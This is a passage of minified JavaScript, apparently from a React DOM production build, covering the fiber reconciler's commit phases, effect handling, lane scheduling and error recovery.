5:e.memoizedProps.suppressHydrationWarning!==!0&&Fs(l.nodeValue,o,(e.mode&1)!==0)}g&&(n.flags|=4)}else l=(o.nodeType===9?o:o.ownerDocument).createTextNode(l),l[qt]=n,n.stateNode=l}return it(n),null;case 13:if(De(Oe),l=n.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(je&&wt!==null&&(n.mode&1)!==0&&(n.flags&128)===0)uh(),Mi(),n.flags|=98560,g=!1;else if(g=qs(n),l!==null&&l.dehydrated!==null){if(e===null){if(!g)throw Error(r(318));if(g=n.memoizedState,g=g!==null?g.dehydrated:null,!g)throw Error(r(317));g[qt]=n}else Mi(),(n.flags&128)===0&&(n.memoizedState=null),n.flags|=4;it(n),g=!1}else Bt!==null&&(Kl(Bt),Bt=null),g=!0;if(!g)return n.flags&65536?n:null}return(n.flags&128)!==0?(n.lanes=o,n):(l=l!==null,l!==(e!==null&&e.memoizedState!==null)&&l&&(n.child.flags|=8192,(n.mode&1)!==0&&(e===null||(Oe.current&1)!==0?Ge===0&&(Ge=3):Yl())),n.updateQueue!==null&&(n.flags|=4),it(n),null);case 4:return Bi(),Bl(e,n),e===null&&Er(n.stateNode.containerInfo),it(n),null;case 10:return ul(n.type._context),it(n),null;case 17:return ut(n.type)&&Us(),it(n),null;case 19:if(De(Oe),g=n.memoizedState,g===null)return it(n),null;if(l=(n.flags&128)!==0,b=g.rendering,b===null)if(l)Fr(g,!1);else{if(Ge!==0||e!==null&&(e.flags&128)!==0)for(e=n.child;e!==null;){if(b=Zs(e),b!==null){for(n.flags|=128,Fr(g,!1),l=b.updateQueue,l!==null&&(n.updateQueue=l,n.flags|=4),n.subtreeFlags=0,l=o,o=n.child;o!==null;)g=o,e=l,g.flags&=14680066,b=g.alternate,b===null?(g.childLanes=0,g.lanes=e,g.child=null,g.subtreeFlags=0,g.memoizedProps=null,g.memoizedState=null,g.updateQueue=null,g.dependencies=null,g.stateNode=null):(g.childLanes=b.childLanes,g.lanes=b.lanes,g.child=b.child,g.subtreeFlags=0,g.deletions=null,g.memoizedProps=b.memoizedProps,g.memoizedState=b.memoizedState,g.updateQueue=b.updateQueue,g.type=b.type,e=b.dependencies,g.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),o=o.sibling;return Pe(Oe,Oe.current&1|2),n.child}e=e.sibling}g.tail!==null&&ze()>Vi&&(n.flags|=128,l=!0,Fr(g,!1),n.lanes=4194304)}else{if(!l)if(e=Zs(b),e!==null){if(n.flags|=128,l=!0,o=e.updateQueue,o!==null&&(n.updateQueue=o,n.flags|=4),Fr(g,!0),g.tail===null&&g.tailMode==="hidden"&&!b.alternate&&!je)return it(n),null}else 2*ze()-g.renderingStartTime>Vi&&o!==1073741824&&(n.flags|=128,l=!0,Fr(g,!1),n.lanes=4194304);g.isBackwards?(b.sibling=n.child,n.child=b):(o=g.last,o!==null?o.sibling=b:n.child=b,g.last=b)}return g.tail!==null?(n=g.tail,g.rendering=n,g.tail=n.sibling,g.renderingStartTime=ze(),n.sibling=null,o=Oe.current,Pe(Oe,l?o&1|2:o&1),n):(it(n),null);case 22:case 23:return Ql(),l=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==l&&(n.flags|=8192),l&&(n.mode&1)!==0?(kt&1073741824)!==0&&(it(n),n.subtreeFlags&6&&(n.flags|=8192)):it(n),null;case 24:return null;case 25:return null}throw Error(r(156,n.tag))}function _v(e,n){switch(sl(n),n.tag){case 1:return ut(n.type)&&Us(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return Bi(),De(dt),De(tt),bl(),e=n.flags,(e&65536)!==0&&(e&128)===0?(n.flags=e&-65537|128,n):null;case 5:return ml(n),null;case 13:if(De(Oe),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(r(340));Mi()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return De(Oe),null;case 4:return Bi(),null;case 10:return ul(n.type._context),null;case 22:case 23:return Ql(),null;case 24:return null;default:return null}}var lo=!1,rt=!1,Rv=typeof WeakSet=="function"?WeakSet:Set,Y=null;function Fi(e,n){var o=e.ref;if(o!==null)if(typeof o=="function")try{o(null)}catch(l){Ne(e,n,l)}else o.current=null}function Nl(e,n,o){try{o()}catch(l){Ne(e,n,l)}}var cp=!1;function Dv(e,n){if(Qa=Ps,e=Vu(),Ua(e)){if("selectionStart"in e)var o={start:e.selectionStart,end:e.selectionEnd};else e:{o=(o=e.ownerDocument)&&o.defaultView||window;var l=o.getSelection&&o.getSelection();if(l&&l.rangeCount!==0){o=l.anchorNode;var u=l.anchorOffset,g=l.focusNode;l=l.focusOffset;try{o.nodeType,g.nodeType}catch{o=null;break e}var b=0,k=-1,A=-1,j=0,F=0,z=e,N=null;t:for(;;){for(var K;z!==o||u!==0&&z.nodeType!==3||(k=b+u),z!==g||l!==0&&z.nodeType!==3||(A=b+l),z.nodeType===3&&(b+=z.nodeValue.length),(K=z.firstChild)!==null;)N=z,z=K;for(;;){if(z===e)break t;if(N===o&&++j===u&&(k=b),N===g&&++F===l&&(A=b),(K=z.nextSibling)!==null)break;z=N,N=z.parentNode}z=K}o=k===-1||A===-1?null:{start:k,end:A}}else o=null}o=o||{start:0,end:0}}else o=null;for(Ya={focusedElem:e,selectionRange:o},Ps=!1,Y=n;Y!==null;)if(n=Y,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,Y=e;else for(;Y!==null;){n=Y;try{var Z=n.alternate;if((n.flags&1024)!==0)switch(n.tag){case 0:case 11:case 15:break;case 1:if(Z!==null){var ee=Z.memoizedProps,Ve=Z.memoizedState,_=n.stateNode,I=_.getSnapshotBeforeUpdate(n.elementType===n.type?ee:Nt(n.type,ee),Ve);_.__reactInternalSnapshotBeforeUpdate=I}break;case 3:var D=n.stateNode.containerInfo;D.nodeType===1?D.textContent="":D.nodeType===9&&D.documentElement&&D.removeChild(D.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(r(163))}}catch(V){Ne(n,n.return,V)}if(e=n.sibling,e!==null){e.return=n.return,Y=e;break}Y=n.return}return Z=cp,cp=!1,Z}function zr(e,n,o){var l=n.updateQueue;if(l=l!==null?l.lastEffect:null,l!==null){var u=l=l.next;do{if((u.tag&e)===e){var g=u.destroy;u.destroy=void 0,g!==void 0&&Nl(n,o,g)}u=u.next}while(u!==l)}}function co(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var o=n=n.next;do{if((o.tag&e)===e){var l=o.create;o.destroy=l()}o=o.next}while(o!==n)}}function Fl(e){var n=e.ref;if(n!==null){var o=e.stateNode;switch(e.tag){case 5:e=o;break;default:e=o}typeof n=="function"?n(e):n.current=e}}function dp(e){var n=e.alternate;n!==null&&(e.alternate=null,dp(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[qt],delete n[Ir],delete n[tl],delete n[fv],delete n[gv])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function up(e){return e.tag===5||e.tag===3||e.tag===4}function hp(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||up(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function zl(e,n,o){var l=e.tag;if(l===5||l===6)e=e.stateNode,n?o.nodeType===8?o.parentNode.insertBefore(e,n):o.insertBefore(e,n):(o.nodeType===8?(n=o.parentNode,n.insertBefore(e,o)):(n=o,n.appendChild(e)),o=o._reactRootContainer,o!=null||n.onclick!==null||(n.onclick=zs));else if(l!==4&&(e=e.child,e!==null))for(zl(e,n,o),e=e.sibling;e!==null;)zl(e,n,o),e=e.sibling}function Vl(e,n,o){var l=e.tag;if(l===5||l===6)e=e.stateNode,n?o.insertBefore(e,n):o.appendChild(e);else if(l!==4&&(e=e.child,e!==null))for(Vl(e,n,o),e=e.sibling;e!==null;)Vl(e,n,o),e=e.sibling}var Xe=null,Ft=!1;function An(e,n,o){for(o=o.child;o!==null;)pp(e,n,o),o=o.sibling}function pp(e,n,o){if(Gt&&typeof Gt.onCommitFiberUnmount=="function")try{Gt.onCommitFiberUnmount(xs,o)}catch{}switch(o.tag){case 5:rt||Fi(o,n);case 6:var l=Xe,u=Ft;Xe=null,An(e,n,o),Xe=l,Ft=u,Xe!==null&&(Ft?(e=Xe,o=o.stateNode,e.nodeType===8?e.parentNode.removeChild(o):e.removeChild(o)):Xe.removeChild(o.stateNode));break;case 18:Xe!==null&&(Ft?(e=Xe,o=o.stateNode,e.nodeType===8?el(e.parentNode,o):e.nodeType===1&&el(e,o),br(e)):el(Xe,o.stateNode));break;case 4:l=Xe,u=Ft,Xe=o.stateNode.containerInfo,Ft=!0,An(e,n,o),Xe=l,Ft=u;break;case 0:case 11:case 14:case 15:if(!rt&&(l=o.updateQueue,l!==null&&(l=l.lastEffect,l!==null))){u=l=l.next;do{var g=u,b=g.destroy;g=g.tag,b!==void 0&&((g&2)!==0||(g&4)!==0)&&Nl(o,n,b),u=u.next}while(u!==l)}An(e,n,o);break;case 1:if(!rt&&(Fi(o,n),l=o.stateNode,typeof l.componentWillUnmount=="function"))try{l.props=o.memoizedProps,l.state=o.memoizedState,l.componentWillUnmount()}catch(k){Ne(o,n,k)}An(e,n,o);break;case 21:An(e,n,o);break;case 22:o.mode&1?(rt=(l=rt)||o.memoizedState!==null,An(e,n,o),rt=l):An(e,n,o);break;default:An(e,n,o)}}function fp(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var o=e.stateNode;o===null&&(o=e.stateNode=new Rv),n.forEach(function(l){var u=Vv.bind(null,e,l);o.has(l)||(o.add(l),l.then(u,u))})}}function zt(e,n){var o=n.deletions;if(o!==null)for(var l=0;l<o.length;l++){var u=o[l];try{var g=e,b=n,k=b;e:for(;k!==null;){switch(k.tag){case 5:Xe=k.stateNode,Ft=!1;break e;case 3:Xe=k.stateNode.containerInfo,Ft=!0;break e;case 4:Xe=k.stateNode.containerInfo,Ft=!0;break e}k=k.return}if(Xe===null)throw Error(r(160));pp(g,b,u),Xe=null,Ft=!1;var A=u.alternate;A!==null&&(A.return=null),u.return=null}catch(j){Ne(u,n,j)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)gp(n,e),n=n.sibling}function gp(e,n){var o=e.alternate,l=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(zt(n,e),Qt(e),l&4){try{zr(3,e,e.return),co(3,e)}catch(ee){Ne(e,e.return,ee)}try{zr(5,e,e.return)}catch(ee){Ne(e,e.return,ee)}}break;case 1:zt(n,e),Qt(e),l&512&&o!==null&&Fi(o,o.return);break;case 5:if(zt(n,e),Qt(e),l&512&&o!==null&&Fi(o,o.return),e.flags&32){var u=e.stateNode;try{ar(u,"")}catch(ee){Ne(e,e.return,ee)}}if(l&4&&(u=e.stateNode,u!=null)){var g=e.memoizedProps,b=o!==null?o.memoizedProps:g,k=e.type,A=e.updateQueue;if(e.updateQueue=null,A!==null)try{k==="input"&&g.type==="radio"&&g.name!=null&&Wd(u,g),ba(k,b);var j=ba(k,g);for(b=0;b<A.length;b+=2){var F=A[b],z=A[b+1];F==="style"?Yd(u,z):F==="dangerouslySetInnerHTML"?Jd(u,z):F==="children"?ar(u,z):M(u,F,z,j)}switch(k){case"input":pa(u,g);break;case"textarea":Gd(u,g);break;case"select":var N=u._wrapperState.wasMultiple;u._wrapperState.wasMultiple=!!g.multiple;var K=g.value;K!=null?bi(u,!!g.multiple,K,!1):N!==!!g.multiple&&(g.defaultValue!=null?bi(u,!!g.multiple,g.defaultValue,!0):bi(u,!!g.multiple,g.multiple?[]:"",!1))}u[Ir]=g}catch(ee){Ne(e,e.return,ee)}}break;case 6:if(zt(n,e),Qt(e),l&4){if(e.stateNode===null)throw Error(r(162));u=e.stateNode,g=e.memoizedProps;try{u.nodeValue=g}catch(ee){Ne(e,e.return,ee)}}break;case 3:if(zt(n,e),Qt(e),l&4&&o!==null&&o.memoizedState.isDehydrated)try{br(n.containerInfo)}catch(ee){Ne(e,e.return,ee)}break;case 4:zt(n,e),Qt(e);break;case 13:zt(n,e),Qt(e),u=e.child,u.flags&8192&&(g=u.memoizedState!==null,u.stateNode.isHidden=g,!g||u.alternate!==null&&u.alternate.memoizedState!==null||($l=ze())),l&4&&fp(e);break;case 22:if(F=o!==null&&o.memoizedState!==null,e.mode&1?(rt=(j=rt)||F,zt(n,e),rt=j):zt(n,e),Qt(e),l&8192){if(j=e.memoizedState!==null,(e.stateNode.isHidden=j)&&!F&&(e.mode&1)!==0)for(Y=e,F=e.child;F!==null;){for(z=Y=F;Y!==null;){switch(N=Y,K=N.child,N.tag){case 0:case 11:case 14:case 15:zr(4,N,N.return);break;case 1:Fi(N,N.return);var Z=N.stateNode;if(typeof Z.componentWillUnmount=="function"){l=N,o=N.return;try{n=l,Z.props=n.memoizedProps,Z.state=n.memoizedState,Z.componentWillUnmount()}catch(ee){Ne(l,o,ee)}}break;case 5:Fi(N,N.return);break;case 22:if(N.memoizedState!==null){bp(z);continue}}K!==null?(K.return=N,Y=K):bp(z)}F=F.sibling}e:for(F=null,z=e;;){if(z.tag===5){if(F===null){F=z;try{u=z.stateNode,j?(g=u.style,typeof g.setProperty=="function"?g.setProperty("display","none","important"):g.display="none"):(k=z.stateNode,A=z.memoizedProps.style,b=A!=null&&A.hasOwnProperty("display")?A.display:null,k.style.display=Qd("display",b))}catch(ee){Ne(e,e.return,ee)}}}else if(z.tag===6){if(F===null)try{z.stateNode.nodeValue=j?"":z.memoizedProps}catch(ee){Ne(e,e.return,ee)}}else if((z.tag!==22&&z.tag!==23||z.memoizedState===null||z===e)&&z.child!==null){z.child.return=z,z=z.child;continue}if(z===e)break e;for(;z.sibling===null;){if(z.return===null||z.return===e)break e;F===z&&(F=null),z=z.return}F===z&&(F=null),z.sibling.return=z.return,z=z.sibling}}break;case 19:zt(n,e),Qt(e),l&4&&fp(e);break;case 21:break;default:zt(n,e),Qt(e)}}function Qt(e){var n=e.flags;if(n&2){try{e:{for(var o=e.return;o!==null;){if(up(o)){var l=o;break e}o=o.return}throw Error(r(160))}switch(l.tag){case 5:var u=l.stateNode;l.flags&32&&(ar(u,""),l.flags&=-33);var g=hp(e);Vl(e,g,u);break;case 3:case 4:var b=l.stateNode.containerInfo,k=hp(e);zl(e,k,b);break;default:throw Error(r(161))}}catch(A){Ne(e,e.return,A)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function Mv(e,n,o){Y=e,mp(e)}function mp(e,n,o){for(var l=(e.mode&1)!==0;Y!==null;){var u=Y,g=u.child;if(u.tag===22&&l){var b=u.memoizedState!==null||lo;if(!b){var k=u.alternate,A=k!==null&&k.memoizedState!==null||rt;k=lo;var j=rt;if(lo=b,(rt=A)&&!j)for(Y=u;Y!==null;)b=Y,A=b.child,b.tag===22&&b.memoizedState!==null?vp(u):A!==null?(A.return=b,Y=A):vp(u);for(;g!==null;)Y=g,mp(g),g=g.sibling;Y=u,lo=k,rt=j}yp(e)}else(u.subtreeFlags&8772)!==0&&g!==null?(g.return=u,Y=g):yp(e)}}function yp(e){for(;Y!==null;){var n=Y;if((n.flags&8772)!==0){var o=n.alternate;try{if((n.flags&8772)!==0)switch(n.tag){case 0:case 11:case 15:rt||co(5,n);break;case 1:var l=n.stateNode;if(n.flags&4&&!rt)if(o===null)l.componentDidMount();else{var u=n.elementType===n.type?o.memoizedProps:Nt(n.type,o.memoizedProps);l.componentDidUpdate(u,o.memoizedState,l.__reactInternalSnapshotBeforeUpdate)}var g=n.updateQueue;g!==null&&bh(n,g,l);break;case 3:var b=n.updateQueue;if(b!==null){if(o=null,n.child!==null)switch(n.child.tag){case 5:o=n.child.stateNode;break;case 1:o=n.child.stateNode}bh(n,b,o)}break;case 5:var k=n.stateNode;if(o===null&&n.flags&4){o=k;var A=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":A.autoFocus&&o.focus();break;case"img":A.src&&(o.src=A.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var j=n.alternate;if(j!==null){var F=j.memoizedState;if(F!==null){var z=F.dehydrated;z!==null&&br(z)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(r(163))}rt||n.flags&512&&Fl(n)}catch(N){Ne(n,n.return,N)}}if(n===e){Y=null;break}if(o=n.sibling,o!==null){o.return=n.return,Y=o;break}Y=n.return}}function bp(e){for(;Y!==null;){var n=Y;if(n===e){Y=null;break}var o=n.sibling;if(o!==null){o.return=n.return,Y=o;break}Y=n.return}}function vp(e){for(;Y!==null;){var n=Y;try{switch(n.tag){case 0:case 11:case 15:var o=n.return;try{co(4,n)}catch(A){Ne(n,o,A)}break;case 1:var l=n.stateNode;if(typeof l.componentDidMount=="function"){var u=n.return;try{l.componentDidMount()}catch(A){Ne(n,u,A)}}var g=n.return;try{Fl(n)}catch(A){Ne(n,g,A)}break;case 5:var b=n.return;try{Fl(n)}catch(A){Ne(n,b,A)}}}catch(A){Ne(n,n.return,A)}if(n===e){Y=null;break}var k=n.sibling;if(k!==null){k.return=n.return,Y=k;break}Y=n.return}}var jv=Math.ceil,uo=O.ReactCurrentDispatcher,Ul=O.ReactCurrentOwner,_t=O.ReactCurrentBatchConfig,we=0,Qe=null,We=null,Ze=0,kt=0,zi=wn(0),Ge=0,Vr=null,Qn=0,ho=0,Wl=0,Ur=null,pt=null,$l=0,Vi=1/0,an=null,po=!1,Hl=null,Cn=null,fo=!1,En=null,go=0,Wr=0,Gl=null,mo=-1,yo=0;function lt(){return(we&6)!==0?ze():mo!==-1?mo:mo=ze()}function Pn(e){return(e.mode&1)===0?1:(we&2)!==0&&Ze!==0?Ze&-Ze:yv.transition!==null?(yo===0&&(yo=hu()),yo):(e=Se,e!==0||(e=window.event,e=e===void 0?16:ku(e.type)),e)}function Vt(e,n,o,l){if(50<Wr)throw Wr=0,Gl=null,Error(r(185));pr(e,o,l),((we&2)===0||e!==Qe)&&(e===Qe&&((we&2)===0&&(ho|=o),Ge===4&&In(e,Ze)),ft(e,l),o===1&&we===0&&(n.mode&1)===0&&(Vi=ze()+500,$s&&xn()))}function ft(e,n){var o=e.callbackNode;yb(e,n);var l=As(e,e===Qe?Ze:0);if(l===0)o!==null&&cu(o),e.callbackNode=null,e.callbackPriority=0;else if(n=l&-l,e.callbackPriority!==n){if(o!=null&&cu(o),n===1)e.tag===0?mv(kp.bind(null,e)):oh(kp.bind(null,e)),hv(function(){(we&6)===0&&xn()}),o=null;else{switch(pu(l)){case 1:o=Aa;break;case 4:o=du;break;case 16:o=ks;break;case 536870912:o=uu;break;default:o=ks}o=Ip(o,wp.bind(null,e))}e.callbackPriority=n,e.callbackNode=o}}function wp(e,n){if(mo=-1,yo=0,(we&6)!==0)throw Error(r(327));var o=e.callbackNode;if(Ui()&&e.callbackNode!==o)return null;var l=As(e,e===Qe?Ze:0);if(l===0)return null;if((l&30)!==0||(l&e.expiredLanes)!==0||n)n=bo(e,l);else{n=l;var u=we;we|=2;var g=Tp();(Qe!==e||Ze!==n)&&(an=null,Vi=ze()+500,Xn(e,n));do try{Bv();break}catch(k){xp(e,k)}while(!0);dl(),uo.current=g,we=u,We!==null?n=0:(Qe=null,Ze=0,n=Ge)}if(n!==0){if(n===2&&(u=Ca(e),u!==0&&(l=u,n=ql(e,u))),n===1)throw o=Vr,Xn(e,0),In(e,l),ft(e,ze()),o;if(n===6)In(e,l);else{if(u=e.current.alternate,(l&30)===0&&!Ov(u)&&(n=bo(e,l),n===2&&(g=Ca(e),g!==0&&(l=g,n=ql(e,g))),n===1))throw o=Vr,Xn(e,0),In(e,l),ft(e,ze()),o;switch(e.finishedWork=u,e.finishedLanes=l,n){case 0:case 1:throw Error(r(345));case 2:Zn(e,pt,an);break;case 3:if(In(e,l),(l&130023424)===l&&(n=$l+500-ze(),10<n)){if(As(e,0)!==0)break;if(u=e.suspendedLanes,(u&l)!==l){lt(),e.pingedLanes|=e.suspendedLanes&u;break}e.timeoutHandle=Za(Zn.bind(null,e,pt,an),n);break}Zn(e,pt,an);break;case 4:if(In(e,l),(l&4194240)===l)break;for(n=e.eventTimes,u=-1;0<l;){var b=31-Ot(l);g=1<<b,b=n[b],b>u&&(u=b),l&=~g}if(l=u,l=ze()-l,l=(120>l?120:480>l?480:1080>l?1080:1920>l?1920:3e3>l?3e3:4320>l?4320:1960*jv(l/1960))-l,10<l){e.timeoutHandle=Za(Zn.bind(null,e,pt,an),l);break}Zn(e,pt,an);break;case 5:Zn(e,pt,an);break;default:throw Error(r(329))}}}return ft(e,ze()),e.callbackNode===o?wp.bind(null,e):null}function ql(e,n){var o=Ur;return e.current.memoizedState.isDehydrated&&(Xn(e,n).flags|=256),e=bo(e,n),e!==2&&(n=pt,pt=o,n!==null&&Kl(n)),e}function Kl(e){pt===null?pt=e:pt.push.apply(pt,e)}function Ov(e){for(var n=e;;){if(n.flags&16384){var o=n.updateQueue;if(o!==null&&(o=o.stores,o!==null))for(var l=0;l<o.length;l++){var u=o[l],g=u.getSnapshot;u=u.value;try{if(!Lt(g(),u))return!1}catch{return!1}}}if(o=n.child,n.subtreeFlags&16384&&o!==null)o.return=n,n=o;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function In(e,n){for(n&=~Wl,n&=~ho,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var o=31-Ot(n),l=1<<o;e[o]=-1,n&=~l}}function kp(e){if((we&6)!==0)throw Error(r(327));Ui();var n=As(e,0);if((n&1)===0)return ft(e,ze()),null;var o=bo(e,n);if(e.tag!==0&&o===2){var l=Ca(e);l!==0&&(n=l,o=ql(e,l))}if(o===1)throw o=Vr,Xn(e,0),In(e,n),ft(e,ze()),o;if(o===6)throw Error(r(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,Zn(e,pt,an),ft(e,ze()),null}function Jl(e,n){var o=we;we|=1;try{return e(n)}finally{we=o,we===0&&(Vi=ze()+500,$s&&xn())}}function Yn(e){En!==null&&En.tag===0&&(we&6)===0&&Ui();var n=we;we|=1;var o=_t.transition,l=Se;try{if(_t.transition=null,Se=1,e)return e()}finally{Se=l,_t.transition=o,we=n,(we&6)===0&&xn()}}function Ql(){kt=zi.current,De(zi)}function Xn(e,n){e.finishedWork=null,e.finishedLanes=0;var o=e.timeoutHandle;if(o!==-1&&(e.timeoutHandle=-1,uv(o)),We!==null)for(o=We.return;o!==null;){var l=o;switch(sl(l),l.tag){case 1:l=l.type.childContextTypes,l!=null&&Us();break;case 3:Bi(),De(dt),De(tt),bl();break;case 5:ml(l);break;case 4:Bi();break;case 13:De(Oe);break;case 19:De(Oe);break;case 10:ul(l.type._context);break;case 22:case 23:Ql()}o=o.return}if(Qe=e,We=e=_n(e.current,null),Ze=kt=n,Ge=0,Vr=null,Wl=ho=Qn=0,pt=Ur=null,qn!==null){for(n=0;n<qn.length;n++)if(o=qn[n],l=o.interleaved,l!==null){o.interleaved=null;var u=l.next,g=o.pending;if(g!==null){var b=g.next;g.next=u,l.next=b}o.pending=l}qn=null}return e}function xp(e,n){do{var o=We;try{if(dl(),eo.current=ro,to){for(var l=Le.memoizedState;l!==null;){var u=l.queue;u!==null&&(u.pending=null),l=l.next}to=!1}if(Jn=0,Je=He=Le=null,Or=!1,Lr=0,Ul.current=null,o===null||o.return===null){Ge=1,Vr=n,We=null;break}e:{var g=e,b=o.return,k=o,A=n;if(n=Ze,k.flags|=32768,A!==null&&typeof A=="object"&&typeof A.then=="function"){var j=A,F=k,z=F.tag;if((F.mode&1)===0&&(z===0||z===11||z===15)){var N=F.alternate;N?(F.updateQueue=N.updateQueue,F.memoizedState=N.memoizedState,F.lanes=N.lanes):(F.updateQueue=null,F.memoizedState=null)}var K=qh(b);if(K!==null){K.flags&=-257,Kh(K,b,k,g,n),K.mode&1&&Gh(g,j,n),n=K,A=j;var Z=n.updateQueue;if(Z===null){var ee=new Set;ee.add(A),n.updateQueue=ee}else Z.add(A);break e}else{if((n&1)===0){Gh(g,j,n),Yl();break e}A=Error(r(426))}}else if(je&&k.mode&1){var Ve=qh(b);if(Ve!==null){(Ve.flags&65536)===0&&(Ve.flags|=256),Kh(Ve,b,k,g,n),ll(Ni(A,k));break e}}g=A=Ni(A,k),Ge!==4&&(Ge=2),Ur===null?Ur=[g]:Ur.push(g),g=b;do{switch(g.tag){case 3:g.flags|=65536,n&=-n,g.lanes|=n;var _=$h(g,A,n);yh(g,_);break e;case 1:k=A;var I=g.type,D=g.stateNode;if((g.flags&128)===0&&(typeof I.getDerivedStateFromError=="function"||D!==null&&typeof D.componentDidCatch=="function"&&(Cn===null||!Cn.has(D)))){g.flags|=65536,n&=-n,g.lanes|=n;var V=Hh(g,k,n);yh(g,V);break e}}g=g.return}while(g!==null)}Ap(o)}catch(ne){n=ne,We===o&&o!==null&&(We=o=o.return);continue}break}while(!0)}function Tp(){var e=uo.current;return uo.current=ro,e===null?ro:e}function Yl(){(Ge===0||Ge===3||Ge===2)&&(Ge=4),Qe===null||(Qn&268435455)===0&&(ho&268435455)===0||In(Qe,Ze)}function bo(e,n){var o=we;we|=2;var l=Tp();(Qe!==e||Ze!==n)&&(an=null,Xn(e,n));do try{Lv();break}catch(u){xp(e,u)}while(!0);if(dl(),we=o,uo.current=l,We!==null)throw Error(r(261));return Qe=null,Ze=0,Ge}function Lv(){for(;We!==null;)Sp(We)}function Bv(){for(;We!==null&&!lb();)Sp(We)}function Sp(e){var n=Pp(e.alternate,e,kt);e.memoizedProps=e.pendingProps,n===null?Ap(e):We=n,Ul.current=null}function Ap(e){var n=e;do{var o=n.alternate;if(e=n.return,(n.flags&32768)===0){if(o=Iv(o,n,kt),o!==null){We=o;return}}else{if(o=_v(o,n),o!==null){o.flags&=32767,We=o;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{Ge=6,We=null;return}}if(n=n.sibling,n!==null){We=n;return}We=n=e}while(n!==null);Ge===0&&(Ge=5)}function Zn(e,n,o){var l=Se,u=_t.transition;try{_t.transition=null,Se=1,Nv(e,n,o,l)}finally{_t.transition=u,Se=l}return null}function Nv(e,n,o,l){do Ui();while(En!==null);if((we&6)!==0)throw Error(r(327));o=e.finishedWork;var u=e.finishedLanes;if(o===null)return null;if(e.finishedWork=null,e.finishedLanes=0,o===e.current)throw Error(r(177));e.callbackNode=null,e.callbackPriority=0;var g=o.lanes|o.childLanes;if(bb(e,g),e===Qe&&(We=Qe=null,Ze=0),(o.subtreeFlags&2064)===0&&(o.flags&2064)===0||fo||(fo=!0,Ip(ks,function(){return Ui(),null})),g=(o.flags&15990)!==0,(o.subtreeFlags&15990)!==0||g){g=_t.transition,_t.transition=null;var b=Se;Se=1;var k=we;we|=4,Ul.current=null,Dv(e,o),gp(o,e),rv(Ya),Ps=!!Qa,Ya=Qa=null,e.current=o,Mv(o),cb(),we=k,Se=b,_t.transition=g}else e.current=o;if(fo&&(fo=!1,En=e,go=u),g=e.pendingLanes,g===0&&(Cn=null),hb(o.stateNode),ft(e,ze()),n!==null)for(l=e.onRecoverableError,o=0;o<n.length;o++)u=n[o],l(u.value,{componentStack:u.stack,digest:u.digest});if(po)throw po=!1,e=Hl,Hl=null,e;return(go&1)!==0&&e.tag!==0&&Ui(),g=e.pendingLanes,(g&1)!==0?e===Gl?Wr++:(Wr=0,Gl=e):Wr=0,xn(),null}function Ui(){if(En!==null){var e=pu(go),n=_t.transition,o=Se;try{if(_t.transition=null,Se=16>e?16:e,En===null)var l=!1;else{if(e=En,En=null,go=0,(we&6)!==0)throw Error(r(331));var u=we;for(we|=4,Y=e.current;Y!==null;){var g=Y,b=g.child;if((Y.flags&16)!==0){var k=g.deletions;if(k!==null){for(var A=0;A<k.length;A++){var j=k[A];for(Y=j;Y!==null;){var F=Y;switch(F.tag){case 0:case 11:case 15:zr(8,F,g)}var z=F.child;if(z!==null)z.return=F,Y=z;else for(;Y!==null;){F=Y;var N=F.sibling,K=F.return;if(dp(F),F===j){Y=null;break}if(N!==null){N.return=K,Y=N;break}Y=K}}}var Z=g.alternate;if(Z!==null){var ee=Z.child;if(ee!==null){Z.child=null;do{var Ve=ee.sibling;ee.sibling=null,ee=Ve}while(ee!==null)}}Y=g}}if((g.subtreeFlags&2064)!==0&&b!==null)b.return=g,Y=b;else e:for(;Y!==null;){if(g=Y,(g.flags&2048)!==0)switch(g.tag){case 0:case 11:case 15:zr(9,g,g.return)}var _=g.sibling;if(_!==null){_.return=g.return,Y=_;break e}Y=g.return}}var I=e.current;for(Y=I;Y!==null;){b=Y;var D=b.child;if((b.subtreeFlags&2064)!==0&&D!==null)D.return=b,Y=D;else e:for(b=I;Y!==null;){if(k=Y,(k.flags&2048)!==0)try{switch(k.tag){case 0:case 11:case 15:co(9,k)}}catch(ne){Ne(k,k.return,ne)}if(k===b){Y=null;break e}var V=k.sibling;if(V!==null){V.return=k.return,Y=V;break e}Y=k.return}}if(we=u,xn(),Gt&&typeof Gt.onPostCommitFiberRoot=="function")try{Gt.onPostCommitFiberRoot(xs,e)}catch{}l=!0}return l}finally{Se=o,_t.transition=n}}return!1}function Cp(e,n,o){n=Ni(o,n),n=$h(e,n,1),e=Sn(e,n,1),n=lt(),e!==null&&(pr(e,1,n),ft(e,n))}function Ne(e,n,o){if(e.tag===3)Cp(e,e,o);else for(;n!==null;){if(n.tag===3){Cp(n,e,o);break}else 